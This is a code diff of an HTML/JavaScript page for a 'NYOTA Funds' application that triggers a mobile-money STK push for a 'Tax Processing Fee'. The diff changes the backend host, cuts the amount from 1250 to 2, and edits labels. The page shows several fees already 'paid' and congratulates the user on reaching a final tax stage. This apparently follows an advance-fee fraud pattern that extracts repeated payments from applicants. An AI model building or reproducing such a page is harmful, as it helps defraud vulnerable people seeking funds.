@@ -115,7 +115,7 @@ color:#1565c0;
 <div class="status">
 
 ✅ Processing Fee Paid<br>
-✅ Cross-Network Fee Paid<br>
+✅ Delivery Charges Fee Paid<br>
 ✅ Commitment Fee Paid
 
 </div>
@@ -127,7 +127,6 @@ Congratulations! Your application has reached the final tax processing stage.
 Complete the payment below to finalize the processing of your NYOTA Funds application.
 
 </div>
-
 
 <div class="customer">
 
@@ -143,20 +142,17 @@ Complete the payment below to finalize the processing of your NYOTA Funds applic
 
 </div>
 
-
 <div class="amount">
 
 Tax Processing Fee: KSh 2
 
 </div>
 
-
 <button id="payBtn" onclick="payNow()">
 
 Pay Tax Processing Fee
 
 </button>
-
 
 <p id="stkMessage"></p>
 
@@ -187,7 +183,7 @@ phone || "Not available";
 
 
 // ==========================================
-// PAYMENT
+// PAY TAX
 // ==========================================
 
 async function payNow(){
@@ -217,18 +213,16 @@ btn.disabled = true;
 btn.innerHTML =
 "Sending STK Push...";
 
-message.innerHTML =
-"";
+message.innerHTML = "";
 
 
 try{
 
 const response = await fetch(
 
-"https://swiftwallet-backend-k8kn.onrender.com/stk-push",
+"https://nyota-funds-backend.onrender.com/stk-push",
 
 {
-
 method:"POST",
 
 headers:{
@@ -239,7 +233,7 @@ body:JSON.stringify({
 
 phone:savedPhone,
 
-amount:1250
+amount:2
 
 })
 
@@ -251,7 +245,10 @@ amount:1250
 const data =
 await response.json();
 
-console.log("STK RESPONSE:",data);
+console.log(
+"PAYLOR STK RESPONSE:",
+data
+);
 
 
 // ==========================================
@@ -261,7 +258,8 @@ console.log("STK RESPONSE:",data);
 if(!data.success){
 
 message.innerHTML =
-"❌ " + (data.message || "Payment request failed.");
+"❌ " +
+(data.message || "Payment request failed.");
 
 btn.disabled = false;
 
@@ -274,13 +272,13 @@ return;
 
 
 // ==========================================
-// ALREADY COMPLETED
+// COMPLETED
 // ==========================================
 
 if(data.status === "completed"){
 
 message.innerHTML =
-"✅ Tax payment confirmed. Redirecting...";
+"✅ Tax payment confirmed.<br>Redirecting...";
 
 setTimeout(()=>{
 
@@ -329,7 +327,7 @@ return;
 
 
 // ==========================================
-// CHECK PAYMENT EVERY 3 SECONDS
+// CHECK PAYMENT STATUS
 // ==========================================
 
 const timer =
@@ -337,13 +335,11 @@ setInterval(async()=>{
 
 try{
 
-const res =
-await fetch(
+const res = await fetch(
 
-"https://swiftwallet-backend-k8kn.onrender.com/payment-status",
+"https://nyota-funds-backend.onrender.com/payment-status",
 
 {
-
 method:"POST",
 
 headers:{
@@ -366,7 +362,7 @@ const result =
 await res.json();
 
 console.log(
-"PAYMENT STATUS:",
+"PAYLOR PAYMENT STATUS:",
 result
 );
 
@@ -445,7 +441,7 @@ error
 }catch(error){
 
 console.error(
-"STK ERROR:",
+"PAYLOR STK ERROR:",
 error
 );
 
